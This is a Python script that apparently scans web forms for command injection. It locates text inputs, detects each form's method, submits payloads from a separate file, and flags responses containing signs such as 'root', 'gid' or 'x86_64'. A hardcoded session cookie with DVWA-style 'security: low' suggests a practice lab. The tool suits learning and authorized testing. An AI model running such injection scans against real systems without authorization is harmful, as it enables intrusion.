import requests
import time
from bs4 import BeautifulSoup

success = False


def complete_url(input_url):
    if not input_url.startswith("http"):
        url = "http://" + input_url
    else:
        url = input_url
    return url


def check_url(url):
    res = requests.get(url)
    if res.status_code == 200:
        print("Valid")
        return True
    else:
        print("Invalid")
        # print(res.status_code)
        return False


# 해당 태그의 부모 태그를 재귀적으로 탐색하며 post인지 get인지 판별
def find_in_parent(tag):
    try:
        if 'post' in tag.parent['method'] or 'POST' in tag.parent['method']:
            return 'post'
        elif 'get' in tag.parent['method'] or 'GET' in tag.parent['method']:
            return 'get'
        else:
            return find_in_parent(tag.parent)
    except KeyError as e:
        return find_in_parent(tag.parent)
    except TypeError as e:
        return 'other'


def find_parameters():
    #param_list = {'ip': '', 'Submit': 'Submit'}
    param_list = {'ip': '', 'Submit': 'Submit'}
    input_location = 0
    print("구현 중")
    return param_list, input_location


def scan(url):
    global success
    tmp = []
    input_list = []
    res = requests.get(url)
    soup = BeautifulSoup(res.text, 'html.parser')
    for input_tag in soup.find_all('input', {'type': 'text'}):
        tmp.append(input_tag)

    for tag in tmp:
        method_type = find_in_parent(tag)
        params, loc = find_parameters()
        input_list.append([tag, method_type, params, loc])

    with open("ci.txt", "r") as f:
        data = f.readlines()

    for input_tag in input_list:
        key_list = list(input_tag[2].keys())
        if input_tag[1] == 'post':
            for payload in data:
                payload = payload.strip()
                input_tag[2][key_list[input_tag[3]]] = payload
                #print(payload)
                #print(input_tag)
                cookies = {'PHPSESSID': '58e0jmvoido7h1g622qt6ls782', 'security': 'low'}
                test_res = requests.post(url, data=input_tag[2], cookies=cookies)
                if check_success(test_res.text):
                    print("Find Vulnerability with " + payload + " in " + str(input_tag))
                    success = True
                #time.sleep(1)
        elif input_tag[1] == 'get':
            for payload in data:
                payload = payload.replace(" ", "+").strip()
                input_tag[2][key_list[input_tag[3]]] = payload
                #print(input_tag)
                test_res = requests.get(url, params=input_tag[2])
                if check_success(test_res.text):
                    print("Find Vulnerability with " + payload + " in " + str(input_tag))
                    success = True
                #time.sleep(1)
        else:
            continue

def check_success(res):
    #print(res)
    if ("root" in res or
            "daemon" in res or
            ("groups" in res and "gid" in res) or
            "x86_64" in res or
            "127.0.0.1" in res or
            'commex' in res):
        return True
    return False


def ci_attack(from_usr_url):
    url = complete_url(from_usr_url)
    if check_url(url):
        print("Start test")
        scan(url)
    else:
        print("Start Failed: Connection Failed")

    if success:
        print("Vulnerability Detected")
    else:
        print("vulnerability Undetected")
    print("The test is complete.")